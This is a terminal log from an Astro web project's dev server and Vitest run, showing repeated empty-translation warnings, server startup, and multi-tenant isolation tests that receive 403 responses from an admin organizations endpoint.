[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3cdaa9fb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fd8e4bc4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-33fb5d39 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-35db7427 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d5a4adf has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3324e589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3dbba740 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4f84b975 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c6bd8108 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6e434fad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4445fe7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-210de9b1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7774cf90 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dc7ba910 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-394f1543 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-52a7de43 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bfaab9c6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-725a5050 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db84c061 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f637349 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9895c9db has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f6c6f302 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-773f0211 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6c6267cd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d525a37b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47085c49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6fdf587a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-aa465471 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-34efb0dc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c1421460 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1a0b4cb0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9531d171 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b7f4d73a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7f7ca00 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5bbf47fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8e054462 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a01cf796 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7aaf63f5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4c3f3986 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98e12337 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2c394312 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d99e5924 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5e5fa063 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a209cf34 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ebde45c8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b902dd5e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6bd4a782 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18ca384f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c16b8687 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b9f0a49e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d439c329 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acd54078 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b5252eff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-895714b0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b4d5ca49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d207bac7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fae34b96 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5248e68e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39e22a61 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b6dea38b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-76b83851 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b58ee3b2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-afd81398 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e7c73a7f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-663a4445 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-960a3a6f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-90f2c4c9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-59fe6d1d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db4f9df2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f889093e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-45012c0c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-be30a165 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b151570e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-04c22692 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-718eb0cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-106f3a7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8134bd48 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7f707bea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7fd85cae has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7b5fad44 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6b53607c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4a41bde has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b670fb19 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-037f6f0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-befe1f2c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-cf49f35d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-786371d0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d50fda7c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ffbc9923 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13446ffe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18e50657 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-15e2a589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d5304933 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dbd0a284 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b44634f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-740e7a11 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-728293f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7890a594 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5c8b291f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-522ed44d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-869af36d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d413dd8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38b50d5d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47528800 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-21cf0b9a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f81acf1a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f3ddeab5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-120d5cac has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2d3ff5a3 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-88ebbd55 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5fed9429 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1066ee9f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1e5b258b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-374f73f0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c13580f2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b41de161 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d20767f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13017b6d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4fa98cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-58c974ff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acf1541e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38d95f75 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6a80558 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39536420 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ec51a1d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-83c379d1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-198755b4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d1fc560 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2859c74b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c37c2433 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3ad7e563 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2368a3a2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-0a631f1e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98339492 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6cc6d20 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-17ea2aad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f544f37 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ad4b1452 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1beb50d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-257c96da has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bf93e13f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-69be50ea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-11e90d7b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d26859a0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-44ebf015 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d81e3f7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-10281057 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4dadbcc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4fc5c4de has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7443bbd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e34a43d2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9216e86e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e5ab8d0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-655d9b87 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1dd4e1fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d6eceb9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-41579eef has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:25:56[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 13 localized entries in Astro Content Layer.
[2m20:25:56[22m [34m[content][39m Synced content
[2m20:25:56[22m [34m[vite][39m Port 4321 is in use, trying another one...
[2m20:25:56[22m [34m[vite][39m Port 4322 is in use, trying another one...
[2m20:25:56[22m [34m[vite][39m Port 4323 is in use, trying another one...

[42m[1m astro [22m[49m [32mv5.18.0[39m [2mready in[22m 15030 [2mms[22m

[2mÔöâ[22m Local    [36mhttp://localhost:4324/[39m
[2mÔöâ[22m Network  [2muse --host to expose[22m

[2m20:25:56[22m [32mwatching for file changes...[39m
[2m20:25:59[22m [34m[200][39m /fr/ [2m287ms[22m
[2m20:25:59[22m [34m[200][39m /fr/ [2m289ms[22m
[90mstdout[2m | tests/unit/components/avatar/Avatar.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[2m20:25:59[22m [33m[302][39m / [2m1ms[22m
[2m20:25:59[22m [34m[200][39m /fr/ [2m32ms[22m
[90mstdout[2m | tests/unit/components/avatar/Avatar.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts[2m > [22m[2mMulti-tenant isolation
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ­ƒöÉ prevent committing .env to code: https://dotenvx.com/precommit

[90mstdout[2m | tests/unit/components/avatar/Avatar.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/avatar/Avatar.test.ts [2m([22m[2m26 tests[22m[2m)[22m[33m 32395[2mms[22m[39m
[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts[2m > [22m[2mMulti-tenant isolation
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts[2m > [22m[2mMulti-tenant isolation[2m > [22m[2mMulti-tenant ÔÇö API isolation[2m > [22m[2morg switch requires user membership in target org
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[90mstdout[2m | tests/integration/org-switch.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:26:04[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m3ms[22m
[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts[2m > [22m[2mMulti-tenant isolation[2m > [22m[2mMulti-tenant ÔÇö API isolation[2m > [22m[2morg switch requires user membership in target org
[22m[39m[apiCall]  POST http://localhost:4322/api/admin/organizations

[2m20:26:04[22m [33m[403][39m [33mPOST[39m /api/admin/organizations [2m2ms[22m
[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts[2m > [22m[2mMulti-tenant isolation[2m > [22m[2mMulti-tenant ÔÇö API isolation[2m > [22m[2morg profile endpoint scopes data to active org only
